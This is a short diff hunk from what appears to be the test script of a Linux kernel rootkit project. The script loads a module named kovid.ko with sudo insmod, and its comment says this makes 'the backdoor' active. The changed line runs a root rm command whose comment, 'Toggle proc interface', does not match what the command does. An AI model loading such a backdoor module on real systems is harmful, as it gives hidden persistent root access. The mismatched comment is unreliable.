@@ -18,7 +18,7 @@ sleep 10
 
 # Insert the kernel module and ensure the backdoor is active.
 sudo insmod ../../../build/kovid.ko
-kill -CONT 31337
+sudo bash -c "rm -f 3"  # Toggle proc interface
 
 ###############################################################################
 # Start a busy-loop process.
